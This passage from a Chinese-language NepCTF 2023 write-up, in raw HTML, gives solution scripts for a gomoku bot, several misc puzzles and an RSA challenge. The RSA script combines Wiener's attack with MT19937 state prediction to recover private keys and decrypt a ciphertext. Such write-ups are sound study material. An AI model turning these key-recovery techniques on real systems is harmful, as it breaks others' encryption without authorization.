class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_nice_pos</span>(<span class="params">checkerboard</span>):</span><br><span class="line">    p = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">            <span class="keyword">if</span> checkerboard[i][j] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;.+&quot;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            p.append((check_pos(i, j, checkerboard), i, j))</span><br><span class="line">    p.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> p[<span class="number">0</span>][<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">checkerboard: []</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(checkerboard), end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> checkerboard:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(x), end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># x = random.randint(0, 14)</span></span><br><span class="line">        <span class="comment"># y = random.randint(0, 14)</span></span><br><span class="line">        <span class="comment"># print(x, y)</span></span><br><span class="line">        x, y = get_nice_pos(checkerboard)</span><br><span class="line">        <span class="keyword">if</span> checkerboard[x][y] <span class="keyword">in</span> [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> key[y] + key[x]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s, c, r = getinfo()</span><br><span class="line">        log.success(<span class="string">f&quot;Scoreboard <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line">        log.success(<span class="string">f&quot;Checkerboard \n<span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line">        ans = action(c)</span><br><span class="line">        io.sendline(ans.encode())</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        io = getIO()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>b站发不出去，等了一会儿，flag直接在题目描述了</p>
<p><img src="/p/2023NepCTF/image-20230814100358316.png" alt="image-20230814100358316"></p>
<h2 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h2><p><img src="/p/2023NepCTF/7612dfe97ed54dfe36942465eba34b7.jpg" alt="7612dfe97ed54dfe36942465eba34b7"></p>
<p><a target="_blank" rel="noopener" href="https://ay.medyotan.ga/upload/lwa_moonrunes.png">https://ay.medyotan.ga/upload/lwa_moonrunes.png</a></p>
<p><img src="/p/2023NepCTF/image-20230814104059226.png" alt="image-20230814104059226"></p>
<p>直接出</p>
<p>NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC</p>
<h2 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h2><p>莫斯编码得到<code>YOUSHOULDUSETHISTOXORSOMETHING</code>，字面意思，你需要用这个xor，还有一段直接mid看</p>
<p><img src="/p/2023NepCTF/image-20230814101009564.png" alt="image-20230814101009564"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</span></span><br><span class="line">xx = x.to_bytes(x.bit_length() // <span class="number">8</span> + <span class="number">1</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">key = <span class="string">b&quot;YOUSHOULDUSETHISTOXORSOMETHING&quot;</span></span><br><span class="line"><span class="built_in">print</span>(xx)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key), <span class="built_in">len</span>(xx))</span><br><span class="line"><span class="built_in">print</span>((<span class="built_in">bytearray</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ <span class="number">32</span>, <span class="built_in">zip</span>(xx, key)))))</span><br></pre></td></tr></table></figure>

<p>大小写转换异或32</p>
<h2 id="你也喜欢三月七么"><a href="#你也喜欢三月七么" class="headerlink" title="你也喜欢三月七么"></a>你也喜欢三月七么</h2><p>首先是用群名字sha256得到<code>dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</code>取前面的16个字节</p>
<p><img src="/p/2023NepCTF/image-20230814101534500.png" alt="image-20230814101534500"></p>
<p>得到<a target="_blank" rel="noopener" href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p>
<p><img src="/p/2023NepCTF/image-20230814101546437.png" alt="image-20230814101546437"></p>
<p>一眼星穹铁道的文字</p>
<p><img src="/p/2023NepCTF/efa6d5119c9f4eef31c7cdfea8d5312.png" alt="efa6d5119c9f4eef31c7cdfea8d5312"></p>
<p>翻译可得</p>
<p>HRP_aIways_likes_March_7th这里的aIways的I是大写的i</p>
<h2 id="lic"><a href="#lic" class="headerlink" title="lic"></a>lic</h2><p>磁带信息，先用audiotap转磁带文件，再用010打开</p>
<p><img src="/p/2023NepCTF/image-20230814101909845.png" alt="image-20230814101909845"></p>
<p>可以看到文字的NepCTF形状，利用脚本反转之后可以看到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;attachment.tap&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()[<span class="number">50</span>:].strip(<span class="string">b&quot;\xa0&quot;</span>)</span><br><span class="line">data = <span class="string">b&quot;aaa&quot;</span> + data</span><br><span class="line">chunk = <span class="number">16</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), chunk):</span><br><span class="line">    <span class="comment"># print()</span></span><br><span class="line">    x = data[i:i+chunk][::-<span class="number">1</span>].decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> _: <span class="string">&quot;  &quot;</span> <span class="keyword">if</span> _ == <span class="string">&#x27;&gt;&#x27;</span> <span class="keyword">else</span> _ + <span class="string">&#x27; &#x27;</span>, x)))</span><br></pre></td></tr></table></figure>

<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="random-RSA"><a href="#random-RSA" class="headerlink" title="random_RSA"></a>random_RSA</h2><p>winner’s攻击，这里用了低指数解密算法的脚本<a target="_blank" rel="noopener" href="https://github.com/pablocelayes/rsa-wiener-attack%EF%BC%8C%E6%81%A2%E5%A4%8Dd">https://github.com/pablocelayes/rsa-wiener-attack，恢复d</a></p>
<p>因为phi(n^2)近似(q^2-1)(p^2-1)，先用命令交互出一组数据，之后使用下面脚本爆破</p>
<p>得到d之后</p>
<p>因为$ed-1&#x3D;k(p^2-1)(q^2-1)&#x3D;k(p^2q^2-p^2-q^2+1)&#x3D;k(n^2-p^2-q^2+1)$</p>
<p>所以可以利用$(ed-1+n^2)&#x2F;n$得到k</p>
<p>之后一把梭求p，q即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, iroot</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hack_RSA</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Finds d knowing (e,n)</span></span><br><span class="line"><span class="string">    applying the Wiener continued fraction attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != -<span class="number">1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">n, e</span>):</span><br><span class="line">    d = hack_RSA(e, n * n)</span><br><span class="line">    k = (e * d - <span class="number">1</span> + n * n) // (n * n)</span><br><span class="line">    tmp = (n * n) - ((e * d - <span class="number">1</span>) // k) + <span class="number">1</span> + <span class="number">2</span> * n</span><br><span class="line">    ppq = <span class="built_in">int</span>(iroot(tmp, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">    tmp = (n * n) - ((e * d - <span class="number">1</span>) // k) + <span class="number">1</span> - <span class="number">2</span> * n</span><br><span class="line">    pmq = <span class="built_in">int</span>(iroot(tmp, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">    p = <span class="built_in">int</span>(gcd(ppq + pmq, n))</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="keyword">assert</span> p * q == n</span><br><span class="line">    <span class="keyword">assert</span> e*d % ((p-<span class="number">1</span>) * (q-<span class="number">1</span>)) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p, q, d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ss = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">9664150901450480967690564598017074925278657678428083526647019231493500227501186171121223353625264405549895808023865076405682104148869646937802710197692149880801739296224423720449697986562014962810427149274953670336431969720847239367252577312181797620406921597928891203908280967606801144879943997948288687269135451721341591758893489869339520600383114702594831680556978281938914417626897063741811649257614797234325708166759403120480173752153249168733044607204951768557734895758143808863754965572034240739588491294098941537522398891830128387438317592253663045532862058982832135946842401711673333170801808131328328138409</span></span><br><span class="line"><span class="string">22983334574580917801180860838975915911056113991786778412831201182411314364399816331219602816987801515703576764159087708450625423803558017646160341422267439951044407124414015864769966876129437519084492109510818093789724685834745254039500061544494687297354628168281982577957457924120597256869151402144742486005161738151255767127578010682514603747674732192539709537275806788688798050708598638377916842971631011263261195175705071683872373603843884113967910301479453532836470974019712063094982740534667039293541440015250164631599817949388195744930270131276498157477215483242544464596689268807389029069272532067490083369547669715239977992410158704220313287358936476570197236442784273557421888378497464433353892887766426339418782876390919046890278793088868131975197880580905027785352428189007480894687391277338836087221071379217489414415183919425962364501612704379275059469144794211736312560265881110693864711202763941138206607689382712402597791806706502788925221170513306681258576676019323627743632448114452443097397014141839634039981951855535241851424638689366379545342739319677785567174640217613527540438283508170772807801142587539976048845517400474132948151081974542377578704999265763979523387588936804746887912462709543565738342209411</span></span><br><span class="line"><span class="string">26421545185254987799905424190746332339125127121314171591428976353667115363763727486775614091903284658438097216623238914712478521157241139537987344330841699472419239411492271130318030306609434654284036687937944162679104946235126178521045633190386482424340322162024092955319660759058652161996411895209248718547013152501979160191126988501306653660575206430331327547695958573346502447806907651886805983227927733506487689107733064048662109346548423844168211328529388196436068858018422470472568131170937800147226367812703244919615304030171460050297573510835520868630853149705239212069246257510861666696541821151818169796199</span></span><br><span class="line"><span class="string">647587495710510972114742400831708548154715412535242193260921609695347930936707036639358968164012520349909437957090794941485190580257732521977171932341037504324231632999867734166481147062308183081010136684146530539354916263125020063213571051436518584206830118093755508481812082245822690944819197599760354341006609736609770789666793064642703641481389320623277678173558301629672865116377269127942025612180794827944539599815847863105760862109828389140681525680276554276533927094628602058843675286071339454429465986971694907927688830239142611855187274379851523189108755859657533224271693320278278605425423386495384174568562497627761612422045791957059437741493328698509481368554006456683812993984891378698935039540883929464645807942966456158605263661813471703445078327854656000079848297587266423318192874967873522951070558487797128927313745909508734015212545363132719971877683921675395438436594169300084386617636244174085949981341272801441913192529055922603538974179887610571219493524648953191928761783132985310317276631200614903232826609021472846793881344295699985919781942936761500592413666531213913327520376681809371295266029776133655277736129022073066033964950152867511761886746401418419578828754174047939112010456150675463575657509189</span></span><br><span class="line"><span class="string">10802012890829459540541628896792295078778436077857489427389981093725666739897304883046269390863878441152550000748160396908161524179907858077000487740264046477305439871796448601143325277932003810352123707096051383675738121180861345577006541031517155258339948241289482502904363911440323113072882087374540321696726636204227138558487828152291517517119224906926633391353300941778394425937626996455545868331674490267329118395561623628314372766364381142098697604044336132503664081692651614933878766623288150407771680698950374395680226687162951709227319486379639675961227436372862323642542582705252736363789548988448924281523</span></span><br><span class="line"><span class="string">83164181286675647518830286473660936842056768837605965773754722828164869255002601931877175384944967168423206258868966986144360226269117391889938003716473472419177908278255032274351977454805821764218411534787094767284216135276174354406996436906142025032430967949150772284199385705263345050808935420677789360168112630311736817620156906081165474809562107538852267394278439066621108665747312736533966159229107173152465365414052064089548384023025856375904149686916115214912086305308341266693329116385815754412736749978601321323191864143850174315828039788320203726197797788026323483995092501876361540056171546433345056509023822723392649116651071369395319931930221212866085340561430347693225966408351502938942294604586300299982831155358938495260400185484497256896416324370391657125309375755376057180940858375964786733652546488880996426657064631708252560023474877949301792612429382653730100520713338044964401333750090947037843448152614531864695601400078878276612572266304350518364495335341275038759497131064447619421326513680343303115330200681996349441238490209605256140282866353360785265474868465131016931425931964393177163140173169398499291572984733338118081910704432753107524477347843354958141041369207588577081612844623302487399941453933</span></span><br><span class="line"><span class="string">7896711153350680182046433804310163873530744638818895739714243668607588547792890005637528789452971314751693622472528149754510450552025972279187841776097749142749323304216218612718765727398943401294644022496938258864873262044174164494124912426175372524656376121897875690251938452930789747994519674300862595216275541928658146402252536829579922303097776404657455395450853161185534506599329499328761065707811197966475148318482438088816924842458585192796056395380885795831624193355572079389648572361687920747403086875781493091238221420792111039898275872964722825166960441004965842026859265796562573640732063541877035703999</span></span><br><span class="line"><span class="string">2453336941794377920668315851654619953646928905461467141099094168657719206064766651951427088886039685796776114141822989089619723777926424614857001633051068225552956142083890497598873667557028446871021184458240143729566494812770661669240646268836255291274950055880283884837660674102748619167688728015214974199172102739298082411466099956770246119223362727103493898761907722553589378295675272645561934551025890703140999463094569248990423646872411723328409457823533926161366175638210485154684713670484074111551184519212764546709551586814178654768531770178427218348159524090067132668379834207556749709109588553767744958928030458642933207972731738889836640270310522407082557073074220327314630716521374036182110178874650024321686921170512401592772523798249960102467660742850794643617416339049505280450162445401270432730440216281390479357051798091526529334107226924555476475287445348397336720445992548926807772402601594999910439716972523884323110378738095230641354005535939595738498325951885080299526970515488294162554370726438356887387936240973624985584430961461016270437469408900537013699409622145224578929157293051142754994365105441300293953769949427089080402762107252481674439414260001163630002002209227608718701864539764471854120765149</span></span><br><span class="line"><span class="string">934357599818997062963713308304362991596280828009512110755774617078887165360994483469754259794232045134748049571365890970600399733065188159532911208357285158307632045436603686477662110964558434302467120269827088523605436776745307435600233303494688594128265424710248665574421617599397235608386293736009112635240116363197127688715563025691804376760043956191129689115106451454594303458289356459242344139405236999049625726629507017505219076937886664753583057499783039263793580691707653961619033353122066993401993412281067305045569711817510917816670267012976388544311131447428560310255424118434372129058504068971704509583</span></span><br><span class="line"><span class="string">452535985385426610533595291636837260029529161119012527028832154063118066054114365212225611604413376466306821291622206453481076548722964431496720642815073434660316751461773927736769380260565572635521865666418131804097223787559572584034429232767907408588386908627811135292858626656533240022150603513420578118687227948584091074426900135895322629439907454314781910440178440833975308243442451505929901732597325250942477885257392248372956797459556418043140426549205059992693832494817312609114820874540542115879517751481239945773745036685837555782445189562031306229705420041083026014508308653365829010341657395972738383225136782775802242507679530114388408690163501378818581259836086658314750295168292063413234606975054845567353768299988855117672810051088400466976103022087953981820980574159918396071750775318139479271235473733328684536087473478158695154228827351532739332906517313798270187902326156179644850383883874005798210565002897279183014905697229418005561458301283927876097634598729273370887688127716799146589959547718296529504218197024144569252951455907047844555593109642331128337551457131825334129476995668564725114284200611621984522440766436051246003019078387721989410126014046300337526406832227661211670511374666171933242207761</span></span><br><span class="line"><span class="string">21636726262954983891798049753528884949149278107055957653804164122232750629108771687361858365462276461758050089339414649308189481865701469685971089624677686415038790141344992019067961279901006021154460525723482009962909666812029094177916225260557575750852951983028595026985975759287231315896982867941386247369741207715929550901277459410981688464120324580668604126829385737148142010733680106833740158713528050751799693988082141485112234559239865511692418065113774817308071898684749289577274638116406277808547134140659187860357703459236546455683700089064295899984063024669612762793525503212165546539776762359198804880143</span></span><br><span class="line"><span class="string">121831222096537368999356089708412896046021123796479990498164844552933248218587707868671273702871780046383065460423688141024214392817157791234305056319786064285936708392236448824783787802429682770337272235088202671105152535710294695902974253047704609221448981405609532633533062373004757059178427305919782441807444728003944125735197038228206500793881947731683045961796477046714111614358449413877923492947221540637411996522154279667079850899812790025430709528400798251289702825878302828745393493824877531623611021252456356175891394204733580270256164603165280954431866062942260146653644302782243197898971847034949620717936360716813922698249012591248773536863924987646374098897933678199676635398286431303649466386258192966901198806753276444091301228010214339088108290023638595922653691209504127688631013840850339138278703745938757018854197798962009892613282181507128330931048662067002367216863617848322567299023690624245593206164105677495564960539642415302357595708814138558968835481632687790665010565719903412940128287504825368916534220790908431745824689253975485426199665419413293026825301727942248672409218671101407001619695622271079059718159320809385046289813332457898242478875287662049306326128127096487004090260965504341859573161979</span></span><br><span class="line"><span class="string">5970296459863639263155783075172703907538560676961520474432385024839627916414414908656192009767702560571700661568202705725697718102111106038786955170270219508803648130754658135536335026559679753140733217830203813331793926165711104662514382832955840370630723176415927796955765169553517462286240424922177248496576208476937262840173500549507825256850681559103373575719799534073745792805709350898345377043444572387322205792026096379146084848266043619559701164699491546970266459037417312873294970955821603622312389603295515738649074112877256884131342394799593566008925579319817453597162465762851343362551362340193519234111</span></span><br><span class="line"><span class="string">18976399709138358912615581289803736063685392526627126047585536571255137591890898469016131796862155245718632726865355864471577906314641282253655270136097246496157189183315479252842675388863506996293537386049856520375327248649829502157752917745660189131281987348802723603782945921331000190785525591621756168923822951821404353646825235167866284344617268886872941218738132870839917479807740404673373159559070563008075098345562213387428585134527952927397372161736924000067060148836364979179350873731455181407191524960955000331041112836325967730682314802564504793245212062165765383998948417925582958872582993455246869810367559513521188245827564742949660925007994864642588404989913088438650029238240908588039032304578884090105469536379896758734713314973495243747985470691862911913134723349279860545443973275726615548263752591810660223834517909123784767147753948727361870320431446223866316111276171603492135128216357176021812643706643763587976997347084988208779018873039456862231395447809853586521609100405013300467752808797446255256509955396709060833818059140619116092459497493686455825427088609805918612964163855925495410440760559642006382819680630706627333218589739634830096224810601690036163130895447446190737732854075739908518171940791</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip().split()</span><br><span class="line">arr = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, ss))</span><br><span class="line">xx = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    n = arr[<span class="number">2</span>*x]</span><br><span class="line">    e = arr[<span class="number">2</span>*x + <span class="number">1</span>]</span><br><span class="line">    xx.append(attack(n, e))</span><br><span class="line"><span class="built_in">print</span>(xx)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">global_bits = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> extend_mt19937_predictor <span class="keyword">import</span> ExtendMT19937Predictor</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p, q, d <span class="keyword">in</span> xx:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(p &amp; <span class="number">0xffffffff</span>), <span class="built_in">hex</span>(q &amp; <span class="number">0xffffffff</span>), <span class="built_in">hex</span>(d &amp; <span class="number">0xffffffff</span>))</span><br><span class="line">    <span class="built_in">print</span>(p.bit_length(), q.bit_length(), d.bit_length())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(xx))</span><br><span class="line"><span class="keyword">for</span> xt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">7</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        predictor = ExtendMT19937Predictor()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            <span class="keyword">if</span> xt &amp; (<span class="number">1</span> &lt;&lt; i):</span><br><span class="line">                predictor.setrandbits(xx[i][<span class="number">0</span>] &gt;&gt; <span class="number">32</span>, global_bits - <span class="number">32</span>)</span><br><span class="line">                predictor.setrandbits(xx[i][<span class="number">1</span>] &gt;&gt; <span class="number">32</span>, global_bits - <span class="number">32</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                predictor.setrandbits(xx[i][<span class="number">1</span>] &gt;&gt; <span class="number">32</span>, global_bits - <span class="number">32</span>)</span><br><span class="line">                predictor.setrandbits(xx[i][<span class="number">0</span>] &gt;&gt; <span class="number">32</span>, global_bits - <span class="number">32</span>)</span><br><span class="line">            predictor.setrandbits(xx[i][<span class="number">2</span>] &gt;&gt; <span class="number">32</span>, global_bits - <span class="number">32</span> - <span class="number">32</span>)</span><br><span class="line">        <span class="comment"># d = predictor.predict_getrandbits(global_bits - 32)</span></span><br><span class="line">        <span class="comment"># print(d)</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(xt)</span><br><span class="line">        <span class="keyword">del</span> predictor</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime, invert <span class="keyword">as</span> inverse_mod</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> lcm</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_prime</span>(<span class="params">bits: <span class="built_in">int</span></span>):</span><br><span class="line">    p = (predictor.predict_getrandbits(bits - <span class="number">32</span>) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> next_prime(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_private_key</span>(<span class="params">bits: <span class="built_in">int</span></span>):</span><br><span class="line">    q, p = generate_prime(bits), generate_prime(bits)</span><br><span class="line">    n, phi = p * q, lcm(p-<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(p.bit_length(), q.bit_length())</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(p &amp; <span class="number">0xffffffff</span>), <span class="built_in">hex</span>(q &amp; <span class="number">0xffffffff</span>))</span><br><span class="line">    d = inverse_mod(<span class="number">0x10001</span>, phi)</span><br><span class="line">    privateKey = RSA.construct((<span class="built_in">int</span>(n), <span class="built_in">int</span>(<span class="number">0x10001</span>), <span class="built_in">int</span>(d), <span class="built_in">int</span>(p), <span class="built_in">int</span>(q)))</span><br><span class="line">    <span class="keyword">return</span> privateKey, p &gt; q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">privateKey, signal = generate_private_key(global_bits)</span><br><span class="line">Cipher = PKCS1_v1_5.new(privateKey)</span><br><span class="line">cc = <span class="string">b&quot;\x02\x81\xbe\x9e^\xdc2\xf6V~\x98 \x97\x125\xa2-\xe3gal\x96\x02\xba\xe8\xaaN*\xce\xe98\x8eAhSNz\x08;Vb\xe0\x9d\xe2\x15\xf6\x12\xd6\xe5&#x27;a\xc0\rt\r+\xa4_\xaa\x19\xc4\x97&gt;\xa1\r\x14\x18\xfe\xd4\xa8~d\xfe\x9d\x95&gt;\x0f\x84\xfa/p\xfa\x91\x070\xd1\xa64\xb2N\x9a\xe9\x01\xe9\x91\xa58\x81\xb2\\H&amp;B\xcc\xde\xe8|\x87\xed\x0e)\xd3\xde\x93f\xa5\x0e\xecv\x9c\xcea%\x85\x9e\xb8\x10\x9ea\xdfnME\x18i\xab,\x96&#123;\xab\xf3i\xa9I\xc2\xbb\xac\x81\x12\x04\xf4J8N\xfbE\x0fp.P\x9b\xacrX\xc1Hk\xff-&gt;\x9b\xd99\xd2L\xc2\x849*\xfa\xf3&gt;\x8c&amp;23\xceu\xb7\xf7\xa2\x81\x15\xacOX&#125;\xd3t\xa6T\x1b7\xa9\xf6\x163\x96\xa1\xe1\xd7\xb3e\xccB\x9a\xee\x83B|\x92E&gt;C\xfb\xd5\xc5\xe3#\xa514\xa0\x1b\x03\xbf\xf6\xb3\x1bK\xa2=\xaf3\x03w\x91\xdeU\xb51Y&#125;%\x89\x00&quot;</span></span><br><span class="line"><span class="built_in">print</span>(Cipher.decrypt(cc, <span class="literal">None</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

